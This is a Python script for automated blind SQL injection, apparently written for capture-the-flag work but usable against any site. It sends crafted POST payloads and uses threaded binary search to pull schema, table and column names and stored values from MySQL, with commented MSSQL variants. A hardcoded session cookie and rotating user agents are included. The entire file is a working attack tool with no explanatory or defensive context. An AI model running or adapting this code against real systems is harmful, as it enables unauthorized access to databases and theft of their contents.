#sql injection v2.py
# -*- coding: UTF-8 -*-
import threading
import requests
import random
from urllib.parse import urlencode


headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Cookie": "JSESSIONID=3C57905446A0F271DAB2183A28E7081C",
    "Content-Type": "application/x-www-form-urlencoded"
}

proxies = {"http":"127.0.0.1:8080","https":None}

user_agent = [
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"
]

class MyThread(threading.Thread):
    def __init__(self, func, args):
        threading.Thread.__init__(self)
        self.func = func
        self.args = args
    def getresult(self):
        return self.res
    def run(self):
        self.res = self.func(*self.args)

def payload(i,j):
    global url
    global check

    # sql = "(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)"%(i,j)                                #数据库名字          
    sql = "(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like'qinghai'),%d,1))>%d)#"%(i,j)           #表名
    # sql = "(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='1919810931114514')),%d,1))>%d)#"%(i,j)        #列名
    # sql = "(ord(substr((select(group_concat(flag))from(1919810931114514)),%d,1))>%d)#"%(i,j)
    # sql="(ord(mid(database(),%d,1))>%d)"%(i,j)

    # mssql
    # sql="(ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in ('master','tempdb','model','msdb','ReportServrver%24\MYSQLQLSERVER')),%d,1)) > %d)"%(i,j)
    #print(i)
    # header = {'User-Agent': user_agent[random.randint(0,7)]}
    sql_data ="query="+"3'%2F**%2For%2F**%2F"+sql
    r = requests.post(url,headers=headers,data=sql_data,proxies=proxies)
    # print (r.text)
    if check in r.text:
        res = 1
    else:
        res = 0
 
    return res
 
def exp(a,i):
    lock = threading.Lock()
    low = 31
    high = 127
    lock.acquire()
    while low <= high :
        mid = (low + high) // 2
        o=a+i
        #print(o)
        res = payload(o,mid)
        if res :
            low = mid + 1
        else :
            high = mid - 1
    asci = int((low + high + 1)) // 2
    if (asci == 127 or asci == 31):
        return 0
    # print (asci)
    return chr(asci)
    lock.release()

def main():
    global flag
    a=1
    f=True

    thread_num=8

    while f:
        threads = []
        for i in range(thread_num):
            t = MyThread(exp, (a,i))
            threads.append(t)

        for i in range(thread_num):
            threads[i].start()

        for i in range(thread_num):
            threads[i].join()
            if threads[i].getresult()==0:
                f = False
                break
            else:
                flag = flag + str(threads[i].getresult())

        a = a+8
        print(flag+"\n")

if __name__ == '__main__':
    flag = ""
    url=""#目标url
    check="129"
    main()
